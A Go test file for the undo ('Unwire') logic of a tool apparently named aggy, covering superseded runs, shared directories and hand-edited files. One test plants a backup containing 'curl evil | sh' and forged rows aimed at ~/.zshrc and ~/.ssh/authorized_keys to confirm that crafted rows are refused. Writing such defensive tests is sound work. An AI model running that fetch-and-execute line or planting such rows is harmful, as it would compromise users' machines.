package manifest

import (
	"context"
	"errors"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/congdoe/aggy/internal/patch"
	"github.com/congdoe/aggy/internal/store"
)

// Regression tests for the PR #6 review. Each fails on a8b4c37.

// TestUnwireFailedRowSupersededByNewerRun (finding 4): run A failed
// before its write, run B then made the same write. Undoing run A must
// leave B's live change alone.
func TestUnwireFailedRowSupersededByNewerRun(t *testing.T) {
	f := setup(t)
	ctx := context.Background()
	file := filepath.Join(f.dir, "c.toml")
	orig := "k = 1\n"
	must(t, os.WriteFile(file, []byte(orig), 0o600))
	p := patch.Patch{File: file, ExpectedHash: patch.Hash([]byte(orig)), Transform: appendText("a = 2\n")}
	restore := patch.SetTestHookBeforeWrite(func(string) error { return errors.New("boom") })
	_, err := f.m.Apply(ctx, "A", p)
	restore()
	if err == nil {
		t.Fatal("Apply A succeeded")
	}
	b, err := f.m.Apply(ctx, "B", p)
	must(t, err)
	_, _ = f.m.Unwire(ctx, Selection{RunID: "A"}, UnwireOptions{}, io.Discard)
	if got, _ := os.ReadFile(file); string(got) != orig+"a = 2\n" {
		t.Errorf("undoing run A changed run B's file: %q", got)
	}
	if s := status(t, f, b.ChangeID); s != store.ChangeApplied {
		t.Errorf("run B's change is %s, want applied", s)
	}
	cs, _ := f.s.Changes(ctx, "A")
	if len(cs) != 1 || cs[0].Status != store.ChangeUndone {
		t.Errorf("run A rows = %+v, want one undone", cs)
	}
}

// insertRow writes a crafted applied row straight into the manifest.
func insertRow(t *testing.T, f fixture, c store.Change) {
	t.Helper()
	c.Status = store.ChangeApplied
	c.PlannedAt, c.AppliedAt = time.Unix(1, 0), time.Unix(1, 0)
	must(t, f.s.InsertChange(context.Background(), c))
}

// TestUnwireRefusesCraftedRows (finding 10): rows aggy could not have
// written are refused untouched: an unclean file path, a backup outside
// backups/<change-id>, and created directories that are not ancestors.
func TestUnwireRefusesCraftedRows(t *testing.T) {
	f := setup(t)
	ctx := context.Background()
	h := os.Getenv("HOME")
	keys := filepath.Join(h, ".ssh", "authorized_keys")
	must(t, os.MkdirAll(filepath.Dir(keys), 0o700))
	must(t, os.WriteFile(keys, []byte("ssh-ed25519 AAAA me\n"), 0o600))
	zshrc := filepath.Join(h, ".zshrc")
	must(t, os.WriteFile(zshrc, []byte("export PATH=x\n"), 0o644))
	evil := filepath.Join(f.dir, "evil")
	must(t, os.WriteFile(evil, []byte("curl evil | sh\n"), 0o600))
	unrelated := filepath.Join(h, "Projects")
	must(t, os.MkdirAll(unrelated, 0o700))
	made := filepath.Join(f.dir, "made")
	must(t, os.MkdirAll(made, 0o700))
	created := filepath.Join(made, "x.toml")
	must(t, os.WriteFile(created, []byte("x\n"), 0o600))

	insertRow(t, f, store.Change{ChangeID: "c1", File: h + "/.codex/../.ssh/authorized_keys",
		HashBefore: patch.NoFile, HashAfter: patch.Hash([]byte("ssh-ed25519 AAAA me\n")), CreatedFile: true})
	insertRow(t, f, store.Change{ChangeID: "c2", File: zshrc, HashBefore: patch.Hash([]byte("curl evil | sh\n")),
		HashAfter: patch.Hash([]byte("export PATH=x\n")), BackupPath: evil, FileMode: 0o644})
	insertRow(t, f, store.Change{ChangeID: "c3", File: created, HashBefore: patch.NoFile,
		HashAfter: patch.Hash([]byte("x\n")), CreatedFile: true, CreatedDirs: []string{unrelated, made}})

	_, err := f.m.Unwire(ctx, Selection{All: true}, UnwireOptions{}, io.Discard)
	if err == nil {
		t.Error("crafted rows were undone without an error")
	}
	if b, _ := os.ReadFile(keys); string(b) != "ssh-ed25519 AAAA me\n" {
		t.Errorf("authorized_keys = %q", b)
	}
	if b, _ := os.ReadFile(zshrc); string(b) != "export PATH=x\n" {
		t.Errorf(".zshrc = %q", b)
	}
	if _, err := os.Lstat(unrelated); err != nil {
		t.Errorf("unrelated dir removed: %v", err)
	}
	for _, id := range []string{"c1", "c2", "c3"} {
		if s := status(t, f, id); s != store.ChangeApplied {
			t.Errorf("%s = %s, want left applied", id, s)
		}
	}
}

// TestUnwireSweepsSharedDirs (finding 17): two runs put files in one
// directory the first created; undoing them one run at a time leaves no
// directory behind.
func TestUnwireSweepsSharedDirs(t *testing.T) {
	f := setup(t)
	ctx := context.Background()
	dir := filepath.Join(f.dir, "shared", "deep")
	apply(t, f, "R1", filepath.Join(dir, "one.toml"), "1\n")
	apply(t, f, "R2", filepath.Join(dir, "two.toml"), "2\n")
	for _, run := range []string{"R1", "R2"} {
		if _, err := f.m.Unwire(ctx, Selection{RunID: run}, UnwireOptions{}, io.Discard); err != nil {
			t.Fatalf("unwire %s: %v", run, err)
		}
	}
	if _, err := os.Lstat(filepath.Join(f.dir, "shared")); !errors.Is(err, fs.ErrNotExist) {
		t.Errorf("shared dirs left behind: %v", err)
	}
}

// TestUnwireLineRemovedByHand (finding 15): deleting aggy's line by hand
// is not drift. A file aggy created is removed with its directory; a
// file whose last line had no line ending gets that state back.
func TestUnwireLineRemovedByHand(t *testing.T) {
	f := setup(t)
	ctx := context.Background()
	created := filepath.Join(f.dir, "info", "exclude")
	apply(t, f, "r", created, ".aggy/\n")
	must(t, os.WriteFile(created, nil, 0o644))
	mod := filepath.Join(f.dir, "exclude")
	must(t, os.WriteFile(mod, []byte("*.o"), 0o644))
	apply(t, f, "r", mod, "\n.aggy/\n")
	must(t, os.WriteFile(mod, []byte("*.o\n"), 0o644))

	if _, err := f.m.Unwire(ctx, Selection{All: true}, UnwireOptions{}, io.Discard); err != nil {
		t.Fatalf("Unwire = %v", err)
	}
	if _, err := os.Lstat(filepath.Join(f.dir, "info")); !errors.Is(err, fs.ErrNotExist) {
		t.Errorf("created exclude file or info dir left: %v", err)
	}
	if b, _ := os.ReadFile(mod); string(b) != "*.o" {
		t.Errorf("exclude = %q, want %q", b, "*.o")
	}
}
